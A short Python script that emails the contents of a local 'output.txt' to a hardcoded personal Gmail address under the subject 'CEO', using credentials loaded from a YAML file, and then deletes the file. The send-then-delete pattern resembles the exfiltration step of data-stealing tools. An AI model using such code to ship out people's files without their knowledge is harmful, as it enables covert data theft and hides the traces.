import smtplib
import ssl
from email.message import EmailMessage
import yaml
import os

# Load email credentials from a YAML file
with open("credentials.yml") as f:
    credentials = yaml.load(f, Loader=yaml.FullLoader)

email_sender = credentials['user']
email_password = credentials['password']
email_receiver = 'seunbisi99@gmail.com'

file_path = 'output.txt'  # Replace with your file name
with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
    body = file.read()

# Set the subject of the email
subject = 'CEO'

em = EmailMessage()
em['From'] = email_sender
em['To'] = email_receiver
em['Subject'] = subject
em.set_content(body)

# Add SSL (layer of security)
context = ssl.create_default_context()

# Log in and send the email
with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
    smtp.login(email_sender, email_password)
    smtp.sendmail(email_sender, email_receiver, em.as_string())
if os.path.exists(file_path):
    os.remove(file_path)
    print(f"Deleted file: {file_path}")
else:
    print(f"The file {file_path} does not exist")